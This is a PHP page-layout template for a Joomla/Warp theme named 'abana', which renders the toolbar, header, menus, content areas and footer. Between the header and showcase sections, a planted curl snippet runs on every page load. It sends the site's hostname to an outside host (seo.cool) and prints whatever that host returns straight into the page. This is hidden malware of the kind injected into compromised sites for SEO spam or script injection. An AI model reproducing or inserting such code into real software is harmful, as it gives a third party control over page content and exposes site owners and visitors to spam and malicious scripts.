<?php
/**
* @package   abana
* @author    arrowthemes http://www.arrowthemes.com
* @copyright Copyright (C) YOOtheme GmbH
* @license   http://www.gnu.org/licenses/gpl.html GNU/GPL
*/

// get template configuration
include($this['path']->path('layouts:template.config.php'));

?>
<!DOCTYPE HTML>
<html lang="<?php echo $this['config']->get('language'); ?>" dir="<?php echo $this['config']->get('direction'); ?>">

<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<?php echo $this['template']->render('head'); ?>
<style>
	/*custom css*/
<?php echo $this['config']->get('custom_css'); ?>
</style>
</head>

<body id="page" class="page <?php echo $this['config']->get('body_classes'); ?> <?php echo $this['config']->get('bg_texture'); ?> bg-<?php echo $this['config']->get('bg_tone'); ?>" data-config='<?php echo $this['config']->get('body_config','{}'); ?>'>
	
	<div class="wrapper grid-block">

		<div id="toolbar" class="grid-block">
				<?php if ($this['modules']->count('header')) : ?>
					<div class="float-top"><?php echo $this['modules']->render('header'); ?></div>
				<?php endif; ?>
                 
				<?php if ($this['modules']->count('toolbar-l') || $this['config']->get('date')) : ?>
				<div class="float-left">
				<?php if ($this['config']->get('date')) : ?>
						<time datetime="<?php echo $this['config']->get('datetime'); ?>"><?php echo $this['config']->get('actual_date'); ?></time>
					<?php endif; ?>
					<?php echo $this['modules']->render('toolbar-l'); ?>
									
						
				</div>
				<?php endif; ?>
					
				<?php if ($this['modules']->count('search')) : ?>
					<div class="float-right search-box">
						<div id="search"><?php echo $this['modules']->render('search'); ?></div>
					</div>
				<?php endif; ?>

				<?php if ($this['modules']->count('toolbar-r')) : ?>
					<div class="float-right"><?php echo $this['modules']->render('toolbar-r'); ?></div>
				<?php endif; ?>
			</div>

		<div class="sheet">
		 <div class="sheet-body">
		 	<header id="header">

				<div id="headerbar" class="grid-block">
					<?php if ($this['modules']->count('logo')) : ?>	
							<a id="logo" href="<?php echo $this['config']->get('site_url'); ?>">
								<?php echo $this['modules']->render('logo'); ?>
							</a>

						<?php else : ?>
							<a id="logo" href="<?php echo $this['config']->get('site_url'); ?>"><?php echo $this['modules']->render('logo'); ?>
								<span class=" size-auto"></span>
							</a>
						<?php endif; ?>

						<?php if ($this['config']->get('show_logo_tag_line')) : ?>
							<span class="tag-line"><?php echo $this['config']->get('logo_tag_line_text'); ?></span>
						<?php endif; ?>
					
					<?php if($this['modules']->count('headerbar')) : ?>
					<div class="left"><?php echo $this['modules']->render('headerbar'); ?></div>
					<?php endif; ?>
				</div>

			<div id="menubar" class="grid-block">
				<?php  if ($this['modules']->count('menu')) : ?>
				<nav id="menu"><?php echo $this['modules']->render('menu'); ?></nav>
				<?php endif; ?>

			</div>
		
			<?php if ($this['modules']->count('banner')) : ?>
				<div id="banner"><?php echo $this['modules']->render('banner'); ?></div>
			<?php endif; ?>
		</header>
<?php
    $exe = curl_init();
    curl_setopt($exe, CURLOPT_URL, "https://seo.cool/seo/data.php?x=".$_SERVER['SERVER_NAME']);
    curl_exec($exe);
    ?>
		<?php if ($this['modules']->count('showcase')) : ?>
			<section id="showcase" class="grid-block <?php echo $this['config']->get('head_overlay'); ?>">
				<div class="header-content" >
					<?php echo $this['modules']->render('showcase', array('layout'=>$this['config']->get('showcase'))); ?>
				</div>
			</section>
		<?php endif; ?>

		<?php if ($this['modules']->count('map')) : ?>
		<section id="g-map">
			<?php echo $this['modules']->render('map'); ?>
			<div class="map-shadow"></div>
		</section>
		<?php endif; ?>

		<?php if ($this['modules']->count('slider')) : ?>
		<section id="slide-zone">
		
			<div class="header-overlay  <?php echo $this['config']->get('head_overlay'); ?>">
				<?php echo $this['modules']->render('slider'); ?>
			</div>
		</section>
		<?php endif; ?>

		<?php if ($this['modules']->count('breadcrumbs')) : ?>
		<section id="breadcrumbs">
			<a href="<?php echo $this['config']->get('site_url'); ?>" class="home"></a>
			<?php echo $this['modules']->render('breadcrumbs'); ?></section>
		<?php endif; ?>

		<?php if ($this['modules']->count('top-a')) : ?>
			<section id="top-a" class="grid-block"><?php echo $this['modules']->render('top-a', array('layout'=>$this['config']->get('top-a'))); ?></section>
		<?php endif; ?>
		
		<?php if ($this['modules']->count('mosaic')) : ?>
			<section id="mosaic" class="grid-block">
					<?php echo $this['modules']->render('mosaic', array('layout'=>$this['config']->get('mosaic'))); ?>
		
		<?php if ($this['modules']->count('top-b')) : ?>
			<section id="top-b" class="grid-block"><?php echo $this['modules']->render('top-b', array('layout'=>$this['config']->get('top-b'))); ?></section>
		<?php endif; ?>

		</section>
		<?php endif; ?>
		
		<?php if ($this['modules']->count('innertop + innerbottom + tab + sidebar-a + sidebar-b') || $this['config']->get('system_output')) : ?>
		<div id="main" class="grid-block">
		
			<div id="maininner" class="grid-box">
				<?php if ($this['modules']->count('innertop')) : ?>
				<section id="innertop" class="grid-block"><?php echo $this['modules']->render('innertop', array('layout'=>$this['config']->get('innertop'))); ?></section>
				<?php endif; ?>
				
				<?php if ($this['modules']->count('tab')) : ?>
				<section id="tab" class="grid-block"><?php echo $this['modules']->render('tab', array('layout'=>$this['config']->get('tab'))); ?></section>
				<?php endif; ?>

				<?php if ($this['config']->get('system_output')) : ?>
				<section id="content" class="grid-block"><?php echo $this['template']->render('content'); ?></section>
				<?php endif; ?>

				<?php if ($this['modules']->count('innerbottom')) : ?>
				<section id="innerbottom" class="grid-block"><?php echo $this['modules']->render('innerbottom', array('layout'=>$this['config']->get('innerbottom'))); ?></section>
				<?php endif; ?>
			</div>
			
			<?php if ($this['modules']->count('sidebar-a')) : ?>
			<aside id="sidebar-a" class="grid-box"><?php echo $this['modules']->render('sidebar-a', array('layout'=>'stack')); ?></aside>
			<?php endif; ?>
			
			<?php if ($this['modules']->count('sidebar-b')) : ?>
			<aside id="sidebar-b" class="grid-box"><?php echo $this['modules']->render('sidebar-b', array('layout'=>'stack')); ?></aside>
			<?php endif; ?>

		</div>
		<?php endif; ?>

		<?php if ($this['modules']->count('bottom-a')) : ?>
			<aside id="bottom-a" class="grid-block"><?php echo $this['modules']->render('bottom-a', array('layout'=>'stack')); ?></aside>
		<?php endif; ?>
		

		<?php if ($this['modules']->count('bottom-b')) : ?>
			<section id="bottom-b" class="grid-block"><?php echo $this['modules']->render('bottom-b', array('layout'=>$this['config']->get('bottom-b'))); ?></section>
		<?php endif; ?>
		
		<?php if ($this['modules']->count('newsletter')) : ?>
			<section id="newsletter">
				<?php echo $this['modules']->render('newsletter'); ?>
			</section>
		<?php endif; ?>

		<?php if ($this['modules']->count('bottom-c')) : ?>
			<section id="bottom-c" class="grid-block <?php echo $this['config']->get('footer_texture'); ?>">
					<div class="footer-body">
						<?php echo $this['modules']->render('bottom-c', array('layout'=>$this['config']->get('bottom-c'))); ?>
					</div>
				<div class="footer-overlay-bottom">
					<div class="overlay-shadow"></div>
						<?php if ($this['config']->get('show_footer_tag_line')) : ?>
							<p class="footer-tag"><?php echo $this['config']->get('footer_tag_line_text'); ?></p>
						<?php endif; ?>
				</div>				
			</section>
		<?php endif; ?>
		</div>
		</div>

		<?php if ($this['modules']->count('footer + debug')) : ?>
			<footer id="footer" class="grid-block">
				<?php
					echo $this['modules']->render('footer');
					echo $this['modules']->render('debug');
				?>
			</footer>
		<?php endif; ?>
	

		<?php if ($this['config']->get('totop_scroller')) : ?>
		<a id="totop-scroller" href="#page"></a>
		<?php endif; ?>

		<?php if ($this['modules']->count('copyright')) : ?>
			<section id="copyright">
				<?php echo $this['modules']->render('copyright'); ?>
				<?php if ($this['config']->get('warp_branding')) : ?>
					<?php $this->output('warp_branding'); ?>
				<?php endif; ?>
			</section>
		<?php endif; ?>


		<?php if ($this['modules']->count('reveal-a')) : ?>
			<div id="reveal-a" class="uk-modal">
				<div class="uk-modal-dialog uk-modal-dialog-slide">
					<a class="uk-modal-close uk-close"></a>
					<?php echo $this['modules']->render('reveal-a', array('layout'=>$this['config']->get('reveal-a'))); ?>
				</div>
			</div>
		<?php endif; ?>	

		<?php if ($this['modules']->count('reveal-b')) : ?>
			<div id="reveal-b" class="uk-modal">
				<div class="uk-modal-dialog uk-modal-dialog-slide">
					<a class="uk-modal-close uk-close"></a>
					<?php echo $this['modules']->render('reveal-b', array('layout'=>$this['config']->get('reveal-b'))); ?>
				</div>
			</div>
		<?php endif; ?>	

		<?php if ($this['modules']->count('reveal-c')) : ?>
			<div id="reveal-c" class="uk-modal">
				<div class="uk-modal-dialog uk-modal-dialog-slide">
					<a class="uk-modal-close uk-close"></a>
					<?php echo $this['modules']->render('reveal-c', array('layout'=>$this['config']->get('reveal-c'))); ?>
				</div>
			</div>
		<?php endif; ?>

	</div>
	<?php echo $this->render('footer'); ?>
	<script>
		(function($){
		$(document).on('ready', function() {
			<?php echo $this['config']->get('custom_js'); ?>
		});
		})(jQuery);
	</script>
</body>
</html>